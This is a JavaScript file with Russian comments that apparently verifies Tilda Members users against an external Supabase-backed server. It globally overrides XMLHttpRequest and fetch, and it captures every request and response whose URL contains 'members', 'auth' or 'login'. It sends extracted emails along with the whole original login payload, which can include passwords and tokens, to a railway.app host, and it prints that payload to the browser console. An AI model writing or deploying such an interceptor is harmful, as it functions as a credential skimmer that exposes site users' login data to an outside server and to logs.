// Специальный перехватчик для Tilda Members
(function() {
  console.log('Специальный перехватчик для Tilda Members активирован');
  
  // Функция для отправки email на сервер
  function sendEmailToServer(email, source, originalData) {
    console.log('Отправка email на сервер:', email, 'Источник:', source);
    
    fetch('https://supabase-auth-production-4267.up.railway.app/get-user', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ 
        email: email,
        source: source,
        originalData: originalData
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log('Ответ от сервера:', data);
      
      // Если пользователь найден, выполняем действия
      if (!data.error) {
        showNotification('Пользователь найден: ' + email);
        localStorage.setItem('userVerified', 'true');
        localStorage.setItem('userEmail', email);
      }
    })
    .catch(error => {
      console.error('Ошибка при отправке данных на сервер:', error);
    });
  }
  
  // Функция для отображения уведомления
  function showNotification(message) {
    let notification = document.getElementById('email-verification-notification');
    if (!notification) {
      notification = document.createElement('div');
      notification.id = 'email-verification-notification';
      notification.style.position = 'fixed';
      notification.style.bottom = '20px';
      notification.style.right = '20px';
      notification.style.backgroundColor = '#4CAF50';
      notification.style.color = 'white';
      notification.style.padding = '15px';
      notification.style.borderRadius = '5px';
      notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
      notification.style.zIndex = '9999';
      notification.style.display = 'none';
      document.body.appendChild(notification);
    }
    
    notification.textContent = message;
    notification.style.display = 'block';
    
    setTimeout(() => {
      notification.style.display = 'none';
    }, 5000);
  }
  
  // Функция для перехвата запросов к API Tilda Members
  function interceptTildaMembersAPI() {
    // Перехватываем XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function() {
      this._url = arguments[1];
      this._method = arguments[0];
      
      // Проверяем, является ли запрос запросом к API Tilda Members
      if (this._url && typeof this._url === 'string' && 
          (this._url.includes('members') || this._url.includes('auth') || this._url.includes('login'))) {
        console.log('Перехвачен XHR запрос к API Tilda Members:', this._method, this._url);
        this._isTildaMembersRequest = true;
      }
      
      return originalXHROpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
      // Если это запрос к API Tilda Members, проверяем данные
      if (this._isTildaMembersRequest && data) {
        console.log('Отправляемые данные в API Tilda Members:', data);
        
        try {
          // Пытаемся извлечь email из данных
          let email = null;
          
          // Если данные в формате строки, пытаемся распарсить их
          if (typeof data === 'string') {
            // Проверяем, содержит ли строка email
            const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi;
            const matches = data.match(emailRegex);
            
            if (matches && matches.length > 0) {
              email = matches[0];
              console.log('Извлечен email из данных запроса:', email);
              sendEmailToServer(email, 'tildaMembersXHR', { url: this._url, method: this._method, data: data });
            }
            
            // Также пытаемся распарсить JSON
            try {
              const jsonData = JSON.parse(data);
              
              if (jsonData.email) {
                email = jsonData.email;
                console.log('Извлечен email из JSON данных запроса:', email);
                sendEmailToServer(email, 'tildaMembersXHR', { url: this._url, method: this._method, data: jsonData });
              } else if (jsonData.data && jsonData.data.email) {
                email = jsonData.data.email;
                console.log('Извлечен email из JSON данных запроса (data.email):', email);
                sendEmailToServer(email, 'tildaMembersXHR', { url: this._url, method: this._method, data: jsonData });
              }
            } catch (e) {
              // Игнорируем ошибки при парсинге JSON
            }
          }
        } catch (e) {
          console.error('Ошибка при обработке данных запроса:', e);
        }
      }
      
      // Перехватываем ответ
      if (this._isTildaMembersRequest) {
        this.addEventListener('load', function() {
          console.log('Получен ответ от API Tilda Members:', this.responseText);
          
          try {
            // Пытаемся распарсить ответ как JSON
            const responseData = JSON.parse(this.responseText);
            
            // Ищем email в ответе
            let email = null;
            
            if (responseData.email) {
              email = responseData.email;
            } else if (responseData.data && responseData.data.email) {
              email = responseData.data.email;
            } else if (responseData.fields && responseData.fields.Email) {
              email = responseData.fields.Email;
            } else if (responseData.fields && responseData.fields.email) {
              email = responseData.fields.email;
            } else {
              // Если не нашли email в известных форматах, ищем в строке
              const responseStr = JSON.stringify(responseData);
              const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi;
              const matches = responseStr.match(emailRegex);
              
              if (matches && matches.length > 0) {
                email = matches[0];
              }
            }
            
            if (email) {
              console.log('Извлечен email из ответа API Tilda Members:', email);
              sendEmailToServer(email, 'tildaMembersXHRResponse', { url: this._url, method: this._method, response: responseData });
            }
          } catch (e) {
            // Игнорируем ошибки при парсинге JSON
          }
        });
      }
      
      return originalXHRSend.apply(this, arguments);
    };
    
    // Перехватываем fetch запросы
    const originalFetch = window.fetch;
    
    window.fetch = function(url, options) {
      // Проверяем, является ли запрос запросом к API Tilda Members
      if (url && typeof url === 'string' && 
          (url.includes('members') || url.includes('auth') || url.includes('login'))) {
        console.log('Перехвачен fetch запрос к API Tilda Members:', url, options);
        
        // Проверяем данные запроса
        if (options && options.body) {
          console.log('Отправляемые данные в API Tilda Members (fetch):', options.body);
          
          try {
            // Пытаемся извлечь email из данных
            let email = null;
            
            // Если данные в формате строки, пытаемся распарсить их
            if (typeof options.body === 'string') {
              // Проверяем, содержит ли строка email
              const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi;
              const matches = options.body.match(emailRegex);
              
              if (matches && matches.length > 0) {
                email = matches[0];
                console.log('Извлечен email из данных fetch запроса:', email);
                sendEmailToServer(email, 'tildaMembersFetch', { url: url, method: options ? options.method : 'GET', data: options.body });
              }
              
              // Также пытаемся распарсить JSON
              try {
                const jsonData = JSON.parse(options.body);
                
                if (jsonData.email) {
                  email = jsonData.email;
                  console.log('Извлечен email из JSON данных fetch запроса:', email);
                  sendEmailToServer(email, 'tildaMembersFetch', { url: url, method: options ? options.method : 'GET', data: jsonData });
                } else if (jsonData.data && jsonData.data.email) {
                  email = jsonData.data.email;
                  console.log('Извлечен email из JSON данных fetch запроса (data.email):', email);
                  sendEmailToServer(email, 'tildaMembersFetch', { url: url, method: options ? options.method : 'GET', data: jsonData });
                }
              } catch (e) {
                // Игнорируем ошибки при парсинге JSON
              }
            }
          } catch (e) {
            console.error('Ошибка при обработке данных fetch запроса:', e);
          }
        }
      }
      
      return originalFetch.apply(this, arguments)
        .then(response => {
          // Проверяем, является ли ответ от API Tilda Members
          if (url && typeof url === 'string' && 
              (url.includes('members') || url.includes('auth') || url.includes('login'))) {
            // Клонируем ответ, чтобы не нарушить его обработку
            const clone = response.clone();
            
            // Пытаемся прочитать и проверить данные ответа
            clone.json().then(data => {
              console.log('Получен ответ от API Tilda Members (fetch):', data);
              
              // Ищем email в ответе
              let email = null;
              
              if (data.email) {
                email = data.email;
              } else if (data.data && data.data.email) {
                email = data.data.email;
              } else if (data.fields && data.fields.Email) {
                email = data.fields.Email;
              } else if (data.fields && data.fields.email) {
                email = data.fields.email;
              } else {
                // Если не нашли email в известных форматах, ищем в строке
                const dataStr = JSON.stringify(data);
                const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi;
                const matches = dataStr.match(emailRegex);
                
                if (matches && matches.length > 0) {
                  email = matches[0];
                }
              }
              
              if (email) {
                console.log('Извлечен email из ответа API Tilda Members (fetch):', email);
                sendEmailToServer(email, 'tildaMembersFetchResponse', { url: url, method: options ? options.method : 'GET', response: data });
              }
            }).catch(() => {
              // Игнорируем ошибки при парсинге ответа
            });
          }
          
          return response;
        });
    };
  }
  
  // Запускаем перехватчик API Tilda Members
  interceptTildaMembersAPI();
  
  // Также запускаем при загрузке страницы
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
      interceptTildaMembersAPI();
    });
  }
})();